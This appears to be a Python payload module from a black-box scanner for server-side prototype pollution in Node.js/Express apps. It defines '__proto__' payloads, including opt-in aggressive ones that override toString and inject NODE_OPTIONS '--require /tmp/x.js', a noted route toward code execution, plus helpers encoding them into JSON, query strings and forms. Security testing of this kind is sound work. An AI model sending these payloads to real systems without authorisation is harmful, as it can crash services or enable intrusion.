"""
Server-side (black-box) prototype pollution payloads.

These are non-destructive by default (safe_mode=True): they target
observable behavior changes (JSON formatting, status codes, charset)
rather than crashing the process or polluting properties used in error
handlers. Aggressive payloads are opt-in via safe_mode=False.
"""

import random
import string


def random_marker(prefix: str = "ppfs") -> str:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{suffix}"


# --- Non-destructive / side-channel payloads -------------------------------
# These exploit common Node.js/Express gadget behaviors that are safe to
# trigger: they change the *shape* of the response, not server stability.

def build_safe_payloads(marker: str) -> list:
    """
    Returns list of dicts: {"name", "path" (list of keys for nesting),
    "value", "detect": description of what to look for in the diff}
    """
    payloads = []

    # Express: app.set('json spaces', N) -> changes JSON.stringify indentation
    payloads.append({
        "name": "json_spaces_10",
        "path": ["__proto__", "json spaces"],
        "value": 10,
        "detect": "response JSON body becomes pretty-printed / indentation changes",
    })

    # Express: json replacer / escape settings sometimes read from options object
    payloads.append({
        "name": "json_escape_true",
        "path": ["__proto__", "json escape"],
        "value": True,
        "detect": "non-ASCII characters in JSON response get \\u escaped differently",
    })

    # Some frameworks read a "charset" from merged options and set it on Content-Type
    payloads.append({
        "name": "charset_override",
        "path": ["__proto__", "charset"],
        "value": "ppfs-marker-charset",
        "detect": "Content-Type header charset= changes to marker value",
    })

    # Content-Type override via options merge gadgets (e.g. send/type libs)
    payloads.append({
        "name": "content_type_override",
        "path": ["__proto__", "type"],
        "value": "text/plain",
        "detect": "Content-Type header changes unexpectedly",
    })

    # Generic marker on prototype to catch any reflected/merged config object
    payloads.append({
        "name": "generic_marker_reflect",
        "path": ["__proto__", marker],
        "value": "polluted",
        "detect": f"marker '{marker}' reflected anywhere in response body/headers",
    })

    # Status code gadgets (some error-handling middlewares merge options incl. statusCode)
    payloads.append({
        "name": "status_code_override",
        "path": ["__proto__", "statusCode"],
        "value": 599,
        "detect": "HTTP status code changes to 599 or similar on subsequent requests",
    })

    return payloads


# --- Aggressive / potentially destructive payloads -------------------------
# Disabled unless --aggressive is passed. These can break server behavior
# (e.g. by polluting toString, or properties read by error handlers),
# so they should only run with explicit authorization and understanding
# of risk to the target (even in-scope).

def build_aggressive_payloads(marker: str) -> list:
    payloads = []

    payloads.append({
        "name": "tostring_override",
        "path": ["__proto__", "toString"],
        "value": "() => 'polluted'",  # note: cannot actually send a function via JSON;
                                        # this is sent as a string and only works if the
                                        # target explicitly eval's it (rare) - kept for
                                        # completeness / documentation of the technique
        "detect": "unexpected errors or string coercion changes across unrelated requests",
        "risk": "can break string coercion app-wide; may require process restart",
    })

    payloads.append({
        "name": "env_proto_pollution",
        "path": ["__proto__", "env"],
        "value": {"NODE_OPTIONS": "--require /tmp/x.js"},
        "detect": "out-of-scope / do NOT run against production - documented for awareness only",
        "risk": "extremely high; can lead to RCE in specific misconfigurations; "
                "left here only for authorized lab use, gated hard behind --aggressive",
    })

    return payloads


def nest_payload(path: list, value):
    """
    Turn a path like ['__proto__', 'json spaces'] and a value into a nested
    dict: {"__proto__": {"json spaces": value}}
    """
    d = value
    for key in reversed(path):
        d = {key: d}
    return d


def flatten_to_bracket_query(path: list, value) -> str:
    """
    Turn path + value into bracket-notation query string fragment:
    __proto__[json spaces]=10
    """
    key_part = path[0] + "".join(f"[{p}]" for p in path[1:])
    return f"{key_part}={value}"


def flatten_to_form_body(path: list, value) -> dict:
    """Turn path + value into a single-key dict suitable for form-encoding."""
    key_part = path[0] + "".join(f"[{p}]" for p in path[1:])
    return {key_part: value}
